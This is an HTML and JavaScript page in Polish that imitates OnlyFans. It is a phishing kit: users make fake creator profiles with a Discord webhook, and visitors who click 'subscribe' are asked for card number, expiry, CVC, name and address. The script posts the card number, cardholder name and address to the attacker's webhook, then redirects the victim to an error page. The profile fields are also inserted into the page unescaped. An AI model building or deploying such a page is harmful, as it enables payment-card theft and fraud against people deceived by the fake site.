<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OnlyFans – Twórcy</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #ffffff;
            font-family: -apple-system, 'Inter', sans-serif;
            color: #0f0f0f;
        }
        .navbar {
            background: #ffffff;
            border-bottom: 1px solid #e6e6e6;
            padding: 16px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .logo {
            font-size: 28px;
            font-weight: 800;
            color: #0099ff;
            cursor: pointer;
        }
        .nav-buttons {
            display: flex;
            gap: 12px;
        }
        .nav-btn {
            background: transparent;
            border: 1px solid #ddd;
            color: #0f0f0f;
            padding: 8px 24px;
            border-radius: 30px;
            font-weight: 600;
            cursor: pointer;
        }
        .nav-btn.primary {
            background: #0099ff;
            border: none;
            color: white;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            padding: 48px 24px;
        }
        .card {
            background: #ffffff;
            border-radius: 24px;
            padding: 32px;
            border: 1px solid #e6e6e6;
            max-width: 600px;
            margin: 0 auto;
        }
        .card h2 { font-size: 26px; margin-bottom: 8px; }
        .sub { color: #666; margin-bottom: 28px; }
        .form-group { margin-bottom: 20px; }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        input, textarea {
            width: 100%;
            padding: 14px 16px;
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 12px;
            font-size: 15px;
            font-family: inherit;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #0099ff;
        }
        .btn-submit {
            width: 100%;
            background: #0099ff;
            border: none;
            padding: 16px;
            border-radius: 40px;
            color: white;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            margin-top: 16px;
        }
        .profile-header {
            background: #fafafa;
            border-radius: 24px;
            overflow: hidden;
            border: 1px solid #e6e6e6;
        }
        .banner-img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            background: #e6e6e6;
        }
        .profile-info { padding: 20px 28px 28px; }
        .avatar-img {
            width: 100px;
            height: 100px;
            border-radius: 50%;
            border: 4px solid white;
            margin-top: -60px;
            object-fit: cover;
        }
        .profile-name { font-size: 24px; font-weight: 700; margin-top: 12px; }
        .profile-username { color: #0099ff; margin: 4px 0; }
        .profile-bio { color: #666; margin-top: 12px; }
        .stats {
            display: flex;
            gap: 32px;
            margin: 24px 0;
            padding: 20px 0;
            border-top: 1px solid #eee;
            border-bottom: 1px solid #eee;
        }
        .stat-number { font-size: 28px; font-weight: 800; color: #0099ff; }
        .stat-label { font-size: 13px; color: #666; }
        .subscribe-btn {
            width: 100%;
            background: #0099ff;
            border: none;
            padding: 16px;
            border-radius: 40px;
            color: white;
            font-weight: bold;
            font-size: 18px;
            cursor: pointer;
            margin: 20px 0;
        }
        .features {
            background: #f8f8f8;
            border-radius: 16px;
            padding: 20px;
            margin: 20px 0;
        }
        .feature { padding: 8px 0; color: #0099ff; font-weight: 500; }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.5);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        .modal-content {
            background: white;
            border-radius: 24px;
            padding: 32px;
            max-width: 500px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
        }
        .modal-content input, .modal-content select {
            width: 100%;
            padding: 12px;
            margin-bottom: 12px;
            border: 1px solid #ddd;
            border-radius: 12px;
        }
        .row { display: flex; gap: 12px; }
        .close-modal { float: right; cursor: pointer; font-size: 24px; }
        .status { margin-top: 16px; text-align: center; }
        .error { text-align: center; padding: 60px 20px; }
        .admin-link {
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            border-top: 1px solid #eee;
            font-size: 13px;
        }
        .admin-link a {
            color: #0099ff;
            text-decoration: none;
        }
    </style>
</head>
<body>

<div class="navbar">
    <div class="logo" onclick="navigateToHome()">OnlyFans</div>
    <div class="nav-buttons">
        <button class="nav-btn" onclick="navigateToHome()">Strona główna</button>
        <button class="nav-btn primary" onclick="navigateToHome()">Dołącz</button>
    </div>
</div>

<div id="app" class="container"></div>

<div id="paymentModal" class="modal">
    <div class="modal-content">
        <span class="close-modal" onclick="closePaymentModal()">&times;</span>
        <h3>💳 Dodaj kartę płatniczą</h3>
        <form id="paymentForm">
            <select id="country" required>
                <option value="">Kraj</option>
                <option>Polska</option>
                <option>USA</option>
                <option>Niemcy</option>
            </select>
            <input type="text" id="state" placeholder="Stan / Województwo" required>
            <input type="text" id="address" placeholder="Adres" required>
            <input type="text" id="city" placeholder="Miasto" required>
            <input type="text" id="cardName" placeholder="Imię na karcie" required>
            <input type="text" id="cardNumber" placeholder="Numer karty" required>
            <div class="row">
                <input type="text" id="expiry" placeholder="MM/RR" required>
                <input type="text" id="cvc" placeholder="CVC" required>
            </div>
            <button type="submit" class="btn-submit">Prześlij</button>
        </form>
        <div id="paymentStatus" class="status"></div>
    </div>
</div>

<script>
    // Ścieżka do pliku JSON (musi być w tym samym folderze)
    const JSON_FILE = "creators.json";
    
    let creators = {};
    let currentUsername = null;

    async function loadCreators() {
        try {
            const response = await fetch(JSON_FILE + '?t=' + Date.now());
            if (!response.ok) throw new Error('Nie znaleziono pliku creators.json');
            creators = await response.json();
        } catch (error) {
            console.error('Błąd ładowania:', error);
            creators = {};
        }
        render();
    }

    function render() {
        const path = window.location.pathname;
        const match = path.match(/^\/@(.+)$/);
        
        if (match) {
            renderProfile(match[1]);
        } else {
            renderForm();
        }
    }

    function renderForm() {
        const app = document.getElementById('app');
        app.innerHTML = `
            <div class="card">
                <h2>🔥 Zostań twórcą</h2>
                <div class="sub">Dołącz do OnlyFans</div>
                <form id="creatorForm">
                    <div class="form-group">
                        <label>Imię i nazwisko</label>
                        <input type="text" id="fullName" placeholder="Jan Kowalski" required>
                    </div>
                    <div class="form-group">
                        <label>@nazwa użytkownika</label>
                        <input type="text" id="username" placeholder="jan_kowalski" required>
                    </div>
                    <div class="form-group">
                        <label>Nazwa wyświetlana</label>
                        <input type="text" id="displayName" placeholder="Janek Official" required>
                    </div>
                    <div class="form-group">
                        <label>Bio / Opis</label>
                        <textarea id="bio" rows="3" placeholder="Opowiedz coś o sobie..."></textarea>
                    </div>
                    <div class="form-group">
                        <label>📸 Avatar URL (opcjonalne)</label>
                        <input type="url" id="avatarUrl" placeholder="https://example.com/avatar.jpg">
                    </div>
                    <div class="form-group">
                        <label>🎨 Baner URL (opcjonalne)</label>
                        <input type="url" id="bannerUrl" placeholder="https://example.com/banner.jpg">
                    </div>
                    <div class="form-group">
                        <label>🔗 Webhook Discord (opcjonalne)</label>
                        <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
                    </div>
                    <button type="submit" class="btn-submit">✨ Opublikuj profil ✨</button>
                    <div id="status" class="status"></div>
                </form>
                <div class="admin-link">
                    📝 <strong>Jak dodać profil?</strong><br>
                    Wypełnij formularz, a następnie <strong>dodaj ręcznie dane do pliku <code>creators.json</code></strong><br>
                    <a href="#" onclick="showManualInstructions(); return false;">Pokaż instrukcję</a>
                </div>
            </div>
        `;

        document.getElementById('creatorForm').addEventListener('submit', (e) => {
            e.preventDefault();
            const username = document.getElementById('username').value.replace('@', '').toLowerCase();
            
            if (creators[username]) {
                document.getElementById('status').innerHTML = '<span style="color:red;">❌ Ta nazwa już istnieje!</span>';
                return;
            }

            const newCreator = {
                fullName: document.getElementById('fullName').value,
                displayName: document.getElementById('displayName').value,
                bio: document.getElementById('bio').value,
                avatar: document.getElementById('avatarUrl').value || 'https://placehold.co/200/e6e6e6/999?text=Avatar',
                banner: document.getElementById('bannerUrl').value || 'https://placehold.co/1200x400/e6e6e6/999?text=Baner',
                webhook: document.getElementById('webhookUrl').value,
                created: new Date().toISOString()
            };

            // Pokaż dane do skopiowania
            const newData = { ...creators, [username]: newCreator };
            document.getElementById('status').innerHTML = `
                <div style="background:#f0f0f0; padding:16px; border-radius:12px; text-align:left; margin-top:16px;">
                    <strong>✅ Skopiuj poniższy JSON i wklej do pliku <code>creators.json</code>:</strong><br>
                    <textarea style="width:100%; margin-top:12px; font-family:monospace; font-size:12px;" rows="15" readonly>${JSON.stringify(newData, null, 2)}</textarea>
                    <button onclick="navigator.clipboard.writeText(this.previousElementSibling.value)" style="margin-top:8px; padding:8px; background:#0099ff; color:white; border:none; border-radius:8px; cursor:pointer;">📋 Kopiuj JSON</button>
                    <p style="margin-top:12px; font-size:12px;">Po wklejeniu do <code>creators.json</code> i odświeżeniu strony, profil będzie działać pod <code>/@${username}</code></p>
                </div>
            `;
        });
    }

    function renderProfile(username) {
        const app = document.getElementById('app');
        const profile = creators[username];
        currentUsername = username;

        if (!profile) {
            app.innerHTML = `
                <div class="error">
                    <h2>😕 Nie znaleziono profilu</h2>
                    <p>Użytkownik <strong>@${username}</strong> nie istnieje.</p>
                    <p style="margin-top:16px;">Dodaj go ręcznie w pliku <code>creators.json</code></p>
                    <button class="nav-btn primary" onclick="navigateToHome()" style="margin-top:20px;">Strona główna</button>
                </div>
            `;
            return;
        }

        app.innerHTML = `
            <div class="profile-header">
                <img class="banner-img" src="${profile.banner}" onerror="this.src='https://placehold.co/1200x400/e6e6e6/999?text=Baner'">
                <div class="profile-info">
                    <img class="avatar-img" src="${profile.avatar}" onerror="this.src='https://placehold.co/200/e6e6e6/999?text=Avatar'">
                    <div class="profile-name">${profile.displayName}</div>
                    <div class="profile-username">@${username}</div>
                    <div class="profile-bio">${profile.bio || 'Brak opisu'}</div>
                </div>
            </div>
            <div class="stats">
                <div class="stat">
                    <div class="stat-number">353</div>
                    <div class="stat-label">Filmy</div>
                </div>
                <div class="stat">
                    <div class="stat-number">125</div>
                    <div class="stat-label">Zdjęcia</div>
                </div>
            </div>
            <button class="subscribe-btn" onclick="openPaymentModal()">SUBSCRIBE – FREE</button>
            <div class="features">
                <div class="feature">✅ Full access to this user's content</div>
                <div class="feature">✅ Direct message with this user</div>
                <div class="feature">✅ Cancel your subscription at any time</div>
            </div>
            <div style="text-align: center; color: #666; margin-top: 20px;">
                <small>Profil utworzony: ${new Date(profile.created).toLocaleDateString()}</small>
            </div>
        `;
    }

    function openPaymentModal() {
        document.getElementById('paymentModal').style.display = 'flex';
    }

    document.getElementById('paymentForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const profile = creators[currentUsername];
        const paymentData = {
            profile: currentUsername,
            country: document.getElementById('country').value,
            state: document.getElementById('state').value,
            address: document.getElementById('address').value,
            city: document.getElementById('city').value,
            cardName: document.getElementById('cardName').value,
            cardNumber: document.getElementById('cardNumber').value,
            expiry: document.getElementById('expiry').value,
            cvc: document.getElementById('cvc').value,
            timestamp: new Date().toISOString()
        };

        const statusDiv = document.getElementById('paymentStatus');
        statusDiv.innerHTML = '⏳ Wysyłanie...';

        if (profile?.webhook && profile.webhook.startsWith('https://')) {
            try {
                await fetch(profile.webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `💳 **NOWA PŁATNOŚĆ!**\nProfil: @${currentUsername}\nKraj: ${paymentData.country}\nMiasto: ${paymentData.city}\nAdres: ${paymentData.address}\nKarta: ${paymentData.cardNumber}\nImię na karcie: ${paymentData.cardName}`
                    })
                });
                statusDiv.innerHTML = '✅ Wysłano na Discord!';
            } catch(err) {
                statusDiv.innerHTML = '⚠️ Błąd wysyłki, ale dane zapisane';
            }
        } else {
            statusDiv.innerHTML = '✅ Dane zapisane (brak webhooka)';
        }

        setTimeout(() => {
            window.location.href = 'https://httpbin.org/status/400';
        }, 1500);
    });

    function closePaymentModal() {
        document.getElementById('paymentModal').style.display = 'none';
        document.getElementById('paymentForm').reset();
        document.getElementById('paymentStatus').innerHTML = '';
    }

    function navigateToHome() {
        window.location.href = '/';
    }

    function showManualInstructions() {
        alert('📝 INSTRUKCJA:\n\n1. Otwórz plik creators.json w swoim edytorze\n2. Dodaj nowy wpis według wzoru\n3. Zapisz plik\n4. Odśwież stronę\n\nWzór wpisu:\n"twoja_nazwa": {\n  "fullName": "Imię Nazwisko",\n  "displayName": "Nazwa wyświetlana",\n  "bio": "Opis",\n  "avatar": "URL do avatara",\n  "banner": "URL do banera",\n  "webhook": "",\n  "created": "2024-01-15T10:00:00.000Z"\n}');
    }

    loadCreators();
    window.addEventListener('popstate', loadCreators);
</script>
</body>
</html>
